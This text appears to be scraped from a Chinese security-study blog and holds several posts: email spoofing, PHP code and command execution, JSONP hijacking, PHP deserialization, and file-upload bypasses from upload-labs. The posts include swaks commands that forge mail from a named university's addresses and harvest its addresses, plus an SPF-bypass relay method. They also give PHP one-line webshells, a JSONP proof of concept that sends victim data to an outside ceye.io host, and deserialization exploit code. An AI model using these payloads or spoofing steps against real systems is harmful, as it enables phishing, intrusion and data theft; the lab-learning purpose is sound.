接收端查询发件域名的TXT记录
根据发件端的SPF记录的规则进行匹配，按照声明的策略进行处理

邮件服务器收到来自xx@example.com的一封邮件，发件主机IP为45.77.87.90。这时邮件服务器回去查询example.com的SPF记录，假若SPF记录中允许45.77.87.90,则该邮件为正常邮件
SPF DNS TXT记录示例
com. IN TXT “v=spf1 a ip4:192.168.1.1 ~all”DKIM：Domain Keys Identified Mail区别于SPF，DKIM使用非对称加密的方式对发件人进行身份验证。收件人可以使用发件人的公钥来验证经过数字签名的电子邮件
DKIM DNS TXT记录示例（p是Base64格式的电子邮件服务器的公钥）：
selector._domainkey.example.com IN TXT “v=DKIM1;p=RAG…123”DMARC：Domain-Based Message Authentication, Reporting and Conformance
DMARC只是一项聚合服务，用于确定发件人是否使用SPF和DKIM，以及发件人如何建议收件人应处理声称来自发件人域的失败/欺骗性电子邮件
DMARC DNS TXT记录示例
TXT IN &quot;v=DMARC1;p=quarantine;pct=100;rua=mailto:dmarccheck@example.com;&quot;总结起来就是：

SPF检查电子邮件来源的IP地址是否已授权
DKIM使用密钥检查消息以进行签名验证
DMARC一次性包含了两种方法

搜集邮箱（作为伪造目标，增加可信度）：
1、在线邮箱地址查找:
https://hunter.io/
http://www.veryvp.com
https://anymailfinder.com/
https://www.findemails.com/
2、whois邮箱
3、bing必应搜索”@hzu.edu.cn”
4、目标站点中的联系我们处获取邮箱
5、根据人名猜测/爆破，验证邮箱是否存在
https://tools.verifyemailaddress.io/
6、根据人名创建可能的邮箱地址
http://metricsparrow.com/toolkit/email-permutator/
7、邮箱抓取脚本https://github.com/laramies/theHarvester
theharvester -d  hzu.edu.cn -l 1000 -b all验证是否开启SPF/DKIM：
nslookup -type=txt xxx.com检测SPF记录是否正确：https://www.kitterman.com/spf/validate.html
邮件伪造：没有SPF：1、直接在线发送伪造邮件：https://emkei.cz/http://tool.chacuo.net/mailanonymous
2、 swaks
swaks --to  webmaster@hzu.edu.cn --from tw@hzu.edu.cn --ehlo hzu.edu.cn --body hello --header &quot;Subject: test&quot;有SPF：awake+smtp2go(需要绑定域名、根据提示添加CNAME记录、cloudfare的话需要取消代理)swaks --to  xxxxxx@qq.com --from jwc@hzu.edu.cn -ehlo hzu.edu.cn --body &quot;test&quot; --server mail.smtp2go.com -p 2525 -au &lt;USER&gt;-ap &lt;PASS&gt;
swaks参数说明：
–from test@qq.com //发件人邮箱；
–ehlo qq.com //伪造邮件ehlo头，即是发件人邮箱的域名。提供身份认证
–body “http://www.baidu.com&quot; //引号中的内容即为邮件正文；
–header “Subject:hello” //邮件头信息，subject为邮件标题
–data ./Desktop/email.txt //将正常源邮件的内容保存成TXT文件，再作为正常邮件发送
–attach   xxxxx.docx   //附加附件
https://www.cnblogs.com/xiaozi/p/12906040.html 邮件伪造之SPF绕过的5种思路
https://www.cnblogs.com/backlion/p/10842676.html
https://payloads.online/archivers/2019-05-09/1#0x04-%E7%BB%95%E8%BF%87spf



                            </div>
                            <div class="post-tags">
                                
                            </div>
                            <div class="other">
                                <!--<a><i class="iconfont icon-iconfontordinaryliulan"></i>52</a>-->
                                <!--<a><i class="iconfont icon-icon27"></i>52</a>-->
                                <span><i class="iconfont icon-shijian"></i>May 30, 2020</span>
                            </div>
                        </div>
                    </a>
                
                    <a title="代码/命令执行漏洞" alt="代码/命令执行漏洞" href="/2020/05/24/%E4%BB%A3%E7%A0%81-%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C%E6%BC%8F%E6%B4%9E/"
                       class="post-item swiper-slide flex flex-v">
                        <div class="image">
                            
                                <img title="代码/命令执行漏洞" alt="代码/命令执行漏洞"
                                     src="/images/default.jpg"></img>
                            
                        </div>
                        <div class="content-warp flex1 flex flex-v">
                            <div class="title">&lt; 代码/命令执行漏洞 &gt;</div>
                            <div class="content flex1">
                                
  代码执行代码执行条件：

存在危险函数且传入的参数用户可控
传入的函数&amp;参数用户可控

危险函数：

eval和assert
preg_replace
回调函数
动态函数

eval 和 assert函数：常见的一句话木马实例：
&lt;?php eval(@$_POST[&apos;a&apos;]); ?&gt;

&lt;?php assert(@$_POST[&apos;a&apos;]); ?&gt;eval()函数的参数必须以分号结尾，assert()则不用
pre_replace:
语法：
preg_replace ( mixed $pattern , mixed $replacement , mixed $subject [, int $limit = -1 [, int &amp;$count ]] ) : mixed若正则表达式$pattern中有/e修饰符且成功匹配，则将$replacement的值当作php代码执行
实例：
&lt;?php
    preg_replace(&apos;/\[(.*)\]/e&apos;, &apos;\\1&apos;, $_GET[&apos;str&apos;]);
?&gt;从$str中搜索[]中间的内容作为第一组结果，\1代表这里使用第一组结果填充
根据官方文档： 
PHP 5.5.0 起， 传入 &quot;\e&quot; 修饰符的时候，会产生一个 E_DEPRECATED 错误； PHP 7.0.0 起，会产生 E_WARNING 错误，同时 &quot;\e&quot; 也无法起效。也意味着preg_replace在php5.5+可用，但是会报警，php7中完全废除不可用

php5.5.38测试结果：

回调函数：常见回调函数：

call_user_func()
array_map()
call_user_func_array()
create_func()
uksort()    
…

以call_user_func_array()为例：
语法：
mixed call_user_func_array ( callable $callback , array $param_arr )把第一个参数作为回调函数（callback）调用，把参数数组作（param_arr）为回调函数的的参数传入。
&lt;?php
    call_user_func_array($_GET[&apos;a&apos;],$_GET[&apos;b&apos;]);
?&gt;http://127.0.0.1/test.php?a=assert&amp;b[]=phpinfo()
动态函数执行：
&lt;?php
$_GET[&apos;a&apos;]($_GET[&apos;b&apos;]);
?&gt;http://127.0.0.1/test.php?a=assert&amp;b=phpinfo()
命令执行顾名思义，命令执行漏洞执行的是系统的命令，因此需要可以执行系统命令的函数存在，且传入参数用户可控
7个命令执行函数：

system()
exec()
shell_exec()
passthru()
pcntl_exec()
popen()
proc_open()

` 也可以执行命令，但是调用的是shell_exec()函数
&lt;?php system(&quot;whoami&quot;);  ?&gt;system() 输出并返回最后一行shell结果。
&lt;?php echo exec(&quot;whoami&quot;); ?&gt;exec() 不输出结果，返回最后一行shell结果，所有结果可以保存到一个返回的数组里面（需要借助echo）。
&lt;?php echo shell_exec(&quot;whoami&quot;); ?&gt;通过 shell 环境执行命令，并且将完整的输出以字符串的方式返回（同样需要借助echo）
&lt;?php passthru(&quot;whoami&quot;); ?&gt;passthru() 只调用命令，把命令的运行结果原样地直接输出到标准输出设备上。
&lt;?php pcntl_exec ( &quot;/bin/bash&quot; , array(&quot;whoami&quot;)); ?&gt;pcntl_exec需要额外安装（）
&lt;?php $handle = popen(&quot;/bin/ls&quot;, &quot;r&quot;); ?&gt;r代表读，w代表写
popen()、proc_open() 不会直接返回执行结果，而是返回一个文件指针
反单引号命令执行
&lt;?php echo  `whoami` ; ?&gt;


                            </div>
                            <div class="post-tags">
                                
                            </div>
                            <div class="other">
                                <!--<a><i class="iconfont icon-iconfontordinaryliulan"></i>52</a>-->
                                <!--<a><i class="iconfont icon-icon27"></i>52</a>-->
                                <span><i class="iconfont icon-shijian"></i>May 24, 2020</span>
                            </div>
                        </div>
                    </a>
                
                    <a title="jsonp劫持" alt="jsonp劫持" href="/2020/05/24/jsonp%E5%8A%AB%E6%8C%81/"
                       class="post-item swiper-slide flex flex-v">
                        <div class="image">
                            
                                <img title="jsonp劫持" alt="jsonp劫持"
                                     src="/images/default.jpg"></img>
                            
                        </div>
                        <div class="content-warp flex1 flex flex-v">
                            <div class="title">&lt; jsonp劫持 &gt;</div>
                            <div class="content flex1">
                                
  JSONP(JSON with Padding)是JSON的一种“使用模式”，创建JSONP是为了授予对JavaScript的跨域读取访问权限，可用于绕过SOP访问跨域数据。
[同源策略]SOP（ Same Origin Policy 策略由浏览器实施，以防止一个Web应用程序从其他Web应用程序检索信息
JSONP 就是为了跨域获取资源而产生的一种非官方的技术手段(官方的有 CORS 和 postMessage),它利用的是 script 标签的 src 属性不受同源策略影响的特性，
JSONP(JSON with Padding)是JSON的一种“使用模式”
jsonp劫持： jsonp 劫持就是攻击者获取了本应该传给网站其他接口的数据（引诱用户点击访问链接，获取API返回给用户的信息）
漏洞源码 
getUser.php
&lt;?php
header(&apos;Content-type: application/json&apos;);
$jsoncallback = htmlspecialchars($_REQUEST [&apos;jsoncallback&apos;]);//获取回调函数名
//json数据
//$json_data = &apos;[&quot;id&quot;,&quot;user&quot;]&apos;;
$json_data=&apos;({&quot;id&quot;:&quot;1&quot;,&quot;name&quot;:&quot;Aaron&quot;})&apos;;
echo $jsoncallback . &quot;(&quot; . $json_data . &quot;)&quot;;//输出jsonp格式的数据
?&gt;客户端实现 callbackFunction 函数
&lt;!DOCTYPE html&gt;
&lt;html&gt;
&lt;head&gt;
&lt;meta charset=&quot;utf-8&quot;&gt;
&lt;title&gt;JSONP劫持测试&lt;/title&gt;
&lt;/head&gt;
&lt;body&gt;
&lt;script type=&quot;text/javascript&quot;&gt;
function callbackFunction(result)
    {
        alert(result.name);
    }
&lt;/script&gt;
&lt;script type=&quot;text/javascript&quot; src=&quot;http://127.0.0.1/getUser.php?jsoncallback=callbackFunction&quot;&gt;&lt;/script&gt;
&lt;/body&gt;
&lt;/html&gt;jsonp漏洞挖掘：首先把Preserve log选项勾上，防止页面刷新跳转的时候访问记录被重置，也方便进行下一步的筛选。

然后 F5 刷新，进入 NetWork 标签 ，CTRL+F 查找一些关键词 如 func、function、call、jsonp、jsonpcallback、callback、cb、json、 email
一次SRC实战漏洞挖掘（没有敏感信息，这里仅作演示）

callback函数可控，测试跨域劫持。poc：
&lt;!DOCTYPE html&gt;
&lt;html lang=&quot;en&quot;&gt;
&lt;head&gt;
&lt;meta charset=&quot;UTF-8&quot;&gt;
&lt;title&gt;JSONP EXP跨域测试&lt;/title&gt;
&lt;/head&gt;
&lt;body&gt;
&lt;script&gt;
function jsonpjack(json){
new Image().src=&quot;http://xxxx.ceye.io/&quot; + JSON.stringify(json)
}
&lt;/script&gt;
&lt;script src=&quot;https://xxxxxsss.baidu.com/new/ApiHome/OneStop/loginTopicInterface?callback=jsonpjack&quot;&gt;&lt;/script&gt;
&lt;/body&gt;
&lt;/html&gt;ceye返回结果：

https://www.freebuf.com/articles/web/126347.html
https://securitycafe.ro/2017/01/18/practical-jsonp-injection/



                            </div>
                            <div class="post-tags">
                                
                            </div>
                            <div class="other">
                                <!--<a><i class="iconfont icon-iconfontordinaryliulan"></i>52</a>-->
                                <!--<a><i class="iconfont icon-icon27"></i>52</a>-->
                                <span><i class="iconfont icon-shijian"></i>May 24, 2020</span>
                            </div>
                        </div>
                    </a>
                
                    <a title="PHP反序列化漏洞学习" alt="PHP反序列化漏洞学习" href="/2020/05/24/PHP%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E6%BC%8F%E6%B4%9E%E5%AD%A6%E4%B9%A0/"
                       class="post-item swiper-slide flex flex-v">
                        <div class="image">
                            
                                <img title="PHP反序列化漏洞学习" alt="PHP反序列化漏洞学习"
                                     src="/images/default.jpg"></img>
                            
                        </div>
                        <div class="content-warp flex1 flex flex-v">
                            <div class="title">&lt; PHP反序列化漏洞学习 &gt;</div>
                            <div class="content flex1">
                                
  什么是序列化&amp;反序列化：序列化的目的是为了将一个对象通过可保存的字节方式存储起来，这样就可以将序列化字节存储到数据库或者文本当中，当需要的时候再通过反序列化获取
所有php里面的值都可以使用函数serialize()来返回一个包含字节流的字符串来表示
unserialize()函数能够重新把字符串变回php原来的值
序列化一个对象将会保存对象的所有变量，但是不会保存对象的方法，只会保存类的名字。
serialize()：
&lt;?php
class Tw{
    public $name = &quot;Twe1ve&quot;;    
    private $sex = &quot;Male&quot;;
}
$Tw_n = new Tw;
$ser = serialize($Tw_n);
echo $ser;
echo &quot;&lt;/br&gt;&quot;;
echo urlencode($ser);
?&gt;输出结果如下：
O:2:&quot;Tw&quot;:2:{s:4:&quot;name&quot;;s:6:&quot;Twe1ve&quot;;s:7:&quot;Twsex&quot;;s:4:&quot;Male&quot;;}
O%3A2%3A%22Tw%22%3A2%3A%7Bs%3A4%3A%22name%22%3Bs%3A6%3A%22Twe1ve%22%3Bs%3A7%3A%22%00Tw%00sex%22%3Bs%3A4%3A%22Male%22%3B%7DO:2:Tw:2:   O代表存储的是对象(object),a的话则代表数组，2指代对象名称有两个字符，Tw则是对象名,2则代表有两个值
{s:4:”name”;s:6:”Twe1ve”;s:7:”Twsex”;s:4:”Male”;}   {}内为属性字符数：属性值；s表示字符串，由于private属性会在类名两侧加入空字节，所以此处Twsex的名称长度7，实际为%00Tw%00sex
unserialize(): [存在private属性的类，需要先将原有的序列化值urlencode输出，再进行反序列化]
&lt;?php
$str = &apos;O%3A2%3A%22Tw%22%3A2%3A%7Bs%3A4%3A%22name%22%3Bs%3A6%3A%22Twe1ve%22%3Bs%3A7%3A%22%00Tw%00sex%22%3Bs%3A4%3A%22Male%22%3B%7D&apos;;
$data = urldecode($str);
$unser = unserialize($data);
var_dump($unser);
?&gt;结果：
object(__PHP_Incomplete_Class)[1]
  public &apos;__PHP_Incomplete_Class_Name&apos; =&gt; string &apos;Tw&apos; (length=2)
  public &apos;name&apos; =&gt; string &apos;Twe1ve&apos; (length=6)
  private &apos;sex&apos; (Tw) =&gt; string &apos;Male&apos; (length=4)在反序列化对象之后，需要当前作用域中存在该类的定义，否则php无法将类对应到指定类
可以看到，当定义域中不存在该类时会反序列化出一个__PHP_Incomplete_Class的类，也就是一个不完整的类
其次，在反序列化的过程中，只保存原有类的变量值，并不会保存其函数，具体的函数功能是根据定义域中定义好的函数功能来执行
&lt;?php
class Tw{
    public $name = &quot;Twe1ve&quot;;    
    private $sex = &quot;Male&quot;;
}
$str = &apos;O%3A2%3A%22Tw%22%3A2%3A%7Bs%3A4%3A%22name%22%3Bs%3A6%3A%22Twe1ve%22%3Bs%3A7%3A%22%00Tw%00sex%22%3Bs%3A4%3A%22Male%22%3B%7D&apos;;
$data = urldecode($str);
$unser = unserialize($data);
var_dump($unser);
?&gt;结果：
object(Tw)[1]
  public &apos;name&apos; =&gt; string &apos;Twe1ve&apos; (length=6)
  private &apos;sex&apos; =&gt; string &apos;Male&apos; (length=4)利用构造函数等魔术方法（Magic function）：

__construct()：构造函数，当对象创建(new)时会自动调用。但在unserialize()时是不会自动调用的。
__destruct()：析构函数，类似于C++。会在到某个对象的所有引用都被删除或者当对象被显式销毁时执行，当对象被销毁时会自动调用。
__wakeup()：如前所提，unserialize()时会检查是否存在 __wakeup()，如果存在，则会优先调用 __wakeup()方法。
__toString():用于处理一个类被当成字符串时应怎样回应，因此当一个对象被当作一个字符串时就会调用。
__sleep():用于提交未提交的数据，或类似的清理操作，因此当一个对象被序列化的时候被调用。
…..

魔术方法执行顺序：__wakeup()&gt; __toString()&gt; __destruct()
漏洞利用1、直接调用，危险函数直接在类中被调用
class cls{
   var $value = &apos;echo 123;&apos;;
   function action(){
eval($this-&gt;value);
}
}
$a = unserialize(&apos;O:3:&quot;cls&quot;:1:{s:5:&quot;value&quot;;s:10:&quot;phpinfo();&quot;;}&apos;);
$a-&gt;action();2、危险函数在魔术方法中
class cls{
var $value = &apos;echo 123;&apos;;
function __wakeup(){
eval($this-&gt;value);
}
}
$a = unserialize(&apos;O:3:&quot;cls&quot;:1:{s:5:&quot;value&quot;;s:10:&quot;phpinfo();&quot;;}&apos;);3、危险函数在其他类中被调用
当一个类中的成员变量是另一个类，且调用了另一个类中的危险函数。此时就可以序列化前者类，从而触发触发漏洞
&lt;?php
class cls1{
var $ser;
function __construct(){
$ser = new ser2();
}
function __wakeup(){
$this-&gt;ser-&gt;evil();
}
}
class cls2{
var $value = &quot;echo 123;&quot;;
function evil(){
eval($this-&gt;value);
}
}
$cls = $GET[&apos;cls&apos;];
$instance = unserialize($cls);
?&gt;exp：
&lt;?php
class cls1{
  var $ser;
function __construct(){
   $this-&gt;ser = new cls2();
   }
}
class cls2{
var $value = &apos;phpinfo();&apos;;
}
print_r(serialize(new cls1()))

?&gt;第二届网鼎杯反序列化题目：
&lt;?php
include(&quot;flag.php&quot;);
highlight_file(__FILE__);
class FileHandler {
protected $op;
protected $filename;
protected $content;
function __construct() {
    $op = &quot;1&quot;;
    $filename = &quot;/tmp/tmpfile&quot;;
    $content = &quot;Hello World!&quot;;
    $this-&gt;process();
}
public function process() {
    if($this-&gt;op == &quot;1&quot;) {
        $this-&gt;write();
    } else if($this-&gt;op == &quot;2&quot;) {
        $res = $this-&gt;read();
        $this-&gt;output($res);
    } else {
        $this-&gt;output(&quot;Bad Hacker!&quot;);
    }
}
private function write() {
    if(isset($this-&gt;filename) &amp;&amp; isset($this-&gt;content)) {
        if(strlen((string)$this-&gt;content) &gt; 100) {
            $this-&gt;output(&quot;Too long!&quot;);
            die();
        }
        $res = file_put_contents($this-&gt;filename, $this-&gt;content);
        if($res) $this-&gt;output(&quot;Successful!&quot;);
        else $this-&gt;output(&quot;Failed!&quot;);
    } else {
        $this-&gt;output(&quot;Failed!&quot;);
    }
}
private function read() {
    $res = &quot;&quot;;
    if(isset($this-&gt;filename)) {
        $res = file_get_contents($this-&gt;filename);
    }
    return $res;
}
private function output($s) {
    echo &quot;[Result]:
&quot;;
    echo $s;
}
function __destruct() {
    if($this-&gt;op === &quot;2&quot;)
        $this-&gt;op = &quot;1&quot;;
    $this-&gt;content = &quot;&quot;;
    $this-&gt;process();
}
}
function is_valid($s) {
for($i = 0; $i &lt; strlen($s); $i++)
    if(!(ord($s[$i]) &gt;= 32 &amp;&amp; ord($s[$i]) &lt;= 125))
        return false;
return true;
}
if(isset($_GET{&apos;str&apos;})) {
$str = (string)$_GET[&apos;str&apos;];
if(is_valid($str)) {
    $obj = unserialize($str);
}
}is_valid : 判断传入字符是否为可打印字符，由于这里的属性均为protected，会生成 %00，但是由于php7对类的修饰不敏感，直接把属性改为public可绕过
__destruct中为强类型比较，还会讲$op置1，process读取文件，需要让$op为2，由于process使用==弱类型比较，直接让$op=2绕过
&lt;?php
class FileHandler {
public $op = 2 ;
public $filename = &quot;flag.php&quot; ;
}
$class = new FileHandler();
$ser = serialize($class);
echo $ser;
?&gt;O:11:”FileHandler”:2:{s:2:”op”;i:2;s:8:”filename”;s:8:”flag.php”;}
链接：https://www.kingkk.com/2018/07/php%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E6%BC%8F%E6%B4%9E/
https://chybeta.github.io/2017/06/17/%E6%B5%85%E8%B0%88php%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E6%BC%8F%E6%B4%9E/
https://xz.aliyun.com/t/3674



                            </div>
                            <div class="post-tags">
                                
                            </div>
                            <div class="other">
                                <!--<a><i class="iconfont icon-iconfontordinaryliulan"></i>52</a>-->
                                <!--<a><i class="iconfont icon-icon27"></i>52</a>-->
                                <span><i class="iconfont icon-shijian"></i>May 24, 2020</span>
                            </div>
                        </div>
                    </a>
                
                    <a title="文件上传漏洞学习" alt="文件上传漏洞学习" href="/2020/05/24/%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0%E6%BC%8F%E6%B4%9E%E5%AD%A6%E4%B9%A0/"
                       class="post-item swiper-slide flex flex-v">
                        <div class="image">
                            
                                <img title="文件上传漏洞学习" alt="文件上传漏洞学习"
                                     src="/images/default.jpg"></img>
                            
                        </div>
                        <div class="content-warp flex1 flex flex-v">
                            <div class="title">&lt; 文件上传漏洞学习 &gt;</div>
                            <div class="content flex1">
                                
  *上传函数： *
move_upload_file()关于PHP中$_FILES数组的使用方法: 

$_FILES[‘file’][‘name’] 客户端文件名称
$_FILES[‘file’][‘type’] 文件的MIME类型
$_FILES[‘file’][‘size’] 文件大小 单位字节
$_FILES[‘file’][‘tmp_name’] 文件被上传后再服务器端临时文件名，可以在php.ini中指定

1、未过滤或前端过滤，upload_labs-pass 1
&lt;script type=&quot;text/javascript&quot;&gt;
function checkFile() {
    var file = document.getElementsByName(&apos;upload_file&apos;)[0].value;
    if (file == null || file == &quot;&quot;) {
        alert(&quot;请选择要上传的文件!&quot;);
        return false;
    }
    //定义允许上传的文件类型
    var allow_ext = &quot;.jpg|.png|.gif&quot;;
    //提取上传文件的类型
    var ext_name = file.substring(file.lastIndexOf(&quot;.&quot;));
    //判断上传文件类型是否允许上传
    if (allow_ext.indexOf(ext_name) == -1) {
        var errMsg = &quot;该文件不允许上传，请上传&quot; + allow_ext + &quot;类型的文件,当前文件类型为：&quot; + ext_name;
        alert(errMsg);
        return false;
    }
}
&lt;/script&gt;2、content-type验证绕过pass-2：
if (($_FILES[&apos;upload_file&apos;][&apos;type&apos;] == &apos;image/jpeg&apos;) || ($_FILES[&apos;upload_file&apos;][&apos;type&apos;]== &apos;image/png&apos;) || ($_FILES[&apos;upload_file&apos;][&apos;type&apos;] == &apos;image/gif&apos;)) {
    $temp_file = $_FILES[&apos;upload_file&apos;][&apos;tmp_name&apos;];
    $img_path = UPLOAD_PATH . &apos;/&apos; . $_FILES[&apos;upload_file&apos;][&apos;name&apos;];        这里仅仅对content-type进行验证，burpsuit抓包之后修改content-type类型即可绕过
3、黑名单限制后缀名绕过pass-3
if (file_exists(UPLOAD_PATH)) {
    $deny_ext = array(&apos;.asp&apos;,&apos;.aspx&apos;,&apos;.php&apos;,&apos;.jsp&apos;);
    $file_name = trim($_FILES[&apos;upload_file&apos;][&apos;name&apos;]);
    $file_name = deldot($file_name);//删除文件名末尾的点
    $file_ext = strrchr($file_name, &apos;.&apos;);
    $file_ext = strtolower($file_ext); //转换为小写
    $file_ext = str_ireplace(&apos;::$DATA&apos;, &apos;&apos;, $file_ext);//去除字符串::$DATA
    $file_ext = trim($file_ext); //收尾去空
    if(!in_array($file_ext, $deny_ext)) {
        $temp_file = $_FILES[&apos;upload_file&apos;][&apos;tmp_name&apos;];
        $img_path = UPLOAD_PATH.&apos;/&apos;.date(&quot;YmdHis&quot;).rand(1000,9999).$file_ext;    
黑名单过滤不全面，php3、php5、phhtml等后缀绕过
黑名单过滤不全面，由于这里不限制.htaccess，可通过上传一个.htaccess重写文件解析规则

pass-4   
$deny_ext = array(&quot;.php&quot;,&quot;.php5&quot;,&quot;.php4&quot;,&quot;.php3&quot;,&quot;.php2&quot;,&quot;php1&quot;,&quot;.html&quot;,&quot;.htm&quot;,&quot;.phtml&quot;,&quot;.pht&quot;,&quot;.pHp&quot;,&quot;.pHp5&quot;,&quot;.pHp4&quot;,&quot;.pHp3&quot;,&quot;.pHp2&quot;,&quot;pHp1&quot;,&quot;.Html&quot;,&quot;.Htm&quot;,&quot;.pHtml&quot;,&quot;.jsp&quot;,&quot;.jspa&quot;,&quot;.jspx&quot;,&quot;.jsw&quot;,&quot;.jsv&quot;,&quot;.jspf&quot;,&quot;.jtml&quot;,&quot;.jSp&quot;,&quot;.jSpx&quot;,&quot;.jSpa&quot;,&quot;.jSw&quot;,&quot;.jSv&quot;,&quot;.jSpf&quot;,&quot;.jHtml&quot;,&quot;.asp&quot;,&quot;.aspx&quot;,&quot;.asa&quot;,&quot;.asax&quot;,&quot;.ascx&quot;,&quot;.ashx&quot;,&quot;.asmx&quot;,&quot;.cer&quot;,&quot;.aSp&quot;,&quot;.aSpx&quot;,&quot;.aSa&quot;,&quot;.aSax&quot;,&quot;.aScx&quot;,&quot;.aShx&quot;,&quot;.aSmx&quot;,&quot;.cEr&quot;,&quot;.sWf&quot;,&quot;.swf&quot;);
   $file_name = trim($_FILES[&apos;upload_file&apos;][&apos;name&apos;]);
   $file_name = deldot($file_name);//删除文件名末尾的点
   $file_ext = strrchr($file_name, &apos;.&apos;);
   $file_ext = strtolower($file_ext); //转换为小写
   $file_ext = str_ireplace(&apos;::$DATA&apos;, &apos;&apos;, $file_ext);//去除字符串::$DATA
   $file_ext = trim($file_ext); //收尾去空
   if(!in_array($file_ext, $deny_ext)) {
       $temp_file = $_FILES[&apos;upload_file&apos;][&apos;tmp_name&apos;];
       $img_path = UPLOAD_PATH.&apos;/&apos;.date(&quot;YmdHis&quot;).rand(1000,9999).$file_ext;     
黑名单过滤相对较全，但是没有将后缀进行大小写统一，可通过大小写绕过
黑名单过滤不全面，由于这里不限制.htaccess，可通过上传一个.htaccess重写文件解析规则

pass-5：       
$deny_ext = array(&quot;.php&quot;,&quot;.php5&quot;,&quot;.php4&quot;,&quot;.php3&quot;,&quot;.php2&quot;,&quot;.html&quot;,&quot;.htm&quot;,&quot;.phtml&quot;,&quot;.pht&quot;,&quot;.pHp&quot;,&quot;.pHp5&quot;,&quot;.pHp4&quot;,&quot;.pHp3&quot;,&quot;.pHp2&quot;,&quot;.Html&quot;,&quot;.Htm&quot;,&quot;.pHtml&quot;,&quot;.jsp&quot;,&quot;.jspa&quot;,&quot;.jspx&quot;,&quot;.jsw&quot;,&quot;.jsv&quot;,&quot;.jspf&quot;,&quot;.jtml&quot;,&quot;.jSp&quot;,&quot;.jSpx&quot;,&quot;.jSpa&quot;,&quot;.jSw&quot;,&quot;.jSv&quot;,&quot;.jSpf&quot;,&quot;.jHtml&quot;,&quot;.asp&quot;,&quot;.aspx&quot;,&quot;.asa&quot;,&quot;.asax&quot;,&quot;.ascx&quot;,&quot;.ashx&quot;,&quot;.asmx&quot;,&quot;.cer&quot;,&quot;.aSp&quot;,&quot;.aSpx&quot;,&quot;.aSa&quot;,&quot;.aSax&quot;,&quot;.aScx&quot;,&quot;.aShx&quot;,&quot;.aSmx&quot;,&quot;.cEr&quot;,&quot;.sWf&quot;,&quot;.swf&quot;,&quot;.htaccess&quot;);
$file_name = trim($_FILES[&apos;upload_file&apos;][&apos;name&apos;]);
$file_name = deldot($file_name);//删除文件名末尾的点
$file_ext = strrchr($file_name, &apos;.&apos;);
$file_ext = str_ireplace(&apos;::$DATA&apos;, &apos;&apos;, $file_ext);//去除字符串::$DATA
$file_ext = trim($file_ext); //首尾去空
if(!in_array($file_ext, $deny_ext)) {
    $temp_file = $_FILES[&apos;upload_file&apos;][&apos;tmp_name&apos;];
    $img_path = UPLOAD_PATH.&apos;/&apos;.date(&quot;YmdHis&quot;).rand(1000,9999).$file_ext;黑名单过滤较全，但是没有将后缀进行大小写统一，可通过大小写绕过
pass-6：   
if (file_exists(UPLOAD_PATH)) {
    $deny_ext = array(&quot;.php&quot;,&quot;.php5&quot;,&quot;.php4&quot;,&quot;.php3&quot;,&quot;.php2&quot;,&quot;.html&quot;,&quot;.htm&quot;,&quot;.phtml&quot;,&quot;.pht&quot;,&quot;.pHp&quot;,&quot;.pHp5&quot;,&quot;.pHp4&quot;,&quot;.pHp3&quot;,&quot;.pHp2&quot;,&quot;.Html&quot;,&quot;.Htm&quot;,&quot;.pHtml&quot;,&quot;.jsp&quot;,&quot;.jspa&quot;,&quot;.jspx&quot;,&quot;.jsw&quot;,&quot;.jsv&quot;,&quot;.jspf&quot;,&quot;.jtml&quot;,&quot;.jSp&quot;,&quot;.jSpx&quot;,&quot;.jSpa&quot;,&quot;.jSw&quot;,&quot;.jSv&quot;,&quot;.jSpf&quot;,&quot;.jHtml&quot;,&quot;.asp&quot;,&quot;.aspx&quot;,&quot;.asa&quot;,&quot;.asax&quot;,&quot;.ascx&quot;,&quot;.ashx&quot;,&quot;.asmx&quot;,&quot;.cer&quot;,&quot;.aSp&quot;,&quot;.aSpx&quot;,&quot;.aSa&quot;,&quot;.aSax&quot;,&quot;.aScx&quot;,&quot;.aShx&quot;,&quot;.aSmx&quot;,&quot;.cEr&quot;,&quot;.sWf&quot;,&quot;.swf&quot;,&quot;.htaccess&quot;);
    $file_name = $_FILES[&apos;upload_file&apos;][&apos;name&apos;];
    $file_name = deldot($file_name);//删除文件名末尾的点
    $file_ext = strrchr($file_name, &apos;.&apos;);
    $file_ext = strtolower($file_ext); //转换为小写
    $file_ext = str_ireplace(&apos;::$DATA&apos;, &apos;&apos;, $file_ext);//去除字符串::$DATA
    if(!in_array($file_ext, $deny_ext)) {
        $temp_file = $_FILES[&apos;upload_file&apos;][&apos;tmp_name&apos;];
        $img_path = UPLOAD_PATH.&apos;/&apos;.date(&quot;YmdHis&quot;).rand(1000,9999).$file_ext;同样还是黑名单，但是没有对后缀名去空出来，后缀名加空格绕过
pass-7（系统特性绕过）       
$deny_ext = array(&quot;.php&quot;,&quot;.php5&quot;,&quot;.php4&quot;,&quot;.php3&quot;,&quot;.php2&quot;,&quot;.html&quot;,&quot;.htm&quot;,&quot;.phtml&quot;,&quot;.pht&quot;,&quot;.pHp&quot;,&quot;.pHp5&quot;,&quot;.pHp4&quot;,&quot;.pHp3&quot;,&quot;.pHp2&quot;,&quot;.Html&quot;,&quot;.Htm&quot;,&quot;.pHtml&quot;,&quot;.jsp&quot;,&quot;.jspa&quot;,&quot;.jspx&quot;,&quot;.jsw&quot;,&quot;.jsv&quot;,&quot;.jspf&quot;,&quot;.jtml&quot;,&quot;.jSp&quot;,&quot;.jSpx&quot;,&quot;.jSpa&quot;,&quot;.jSw&quot;,&quot;.jSv&quot;,&quot;.jSpf&quot;,&quot;.jHtml&quot;,&quot;.asp&quot;,&quot;.aspx&quot;,&quot;.asa&quot;,&quot;.asax&quot;,&quot;.ascx&quot;,&quot;.ashx&quot;,&quot;.asmx&quot;,&quot;.cer&quot;,&quot;.aSp&quot;,&quot;.aSpx&quot;,&quot;.aSa&quot;,&quot;.aSax&quot;,&quot;.aScx&quot;,&quot;.aShx&quot;,&quot;.aSmx&quot;,&quot;.cEr&quot;,&quot;.sWf&quot;,&quot;.swf&quot;,&quot;.htaccess&quot;);
$file_name = trim($_FILES[&apos;upload_file&apos;][&apos;name&apos;]);
$file_ext = strrchr($file_name, &apos;.&apos;);
$file_ext = strtolower($file_ext); //转换为小写
$file_ext = str_ireplace(&apos;::$DATA&apos;, &apos;&apos;, $file_ext);//去除字符串::$DATA
$file_ext = trim($file_ext); //首尾去空
if(!in_array($file_ext, $deny_ext)) {
    $temp_file = $_FILES[&apos;upload_file&apos;][&apos;tmp_name&apos;];
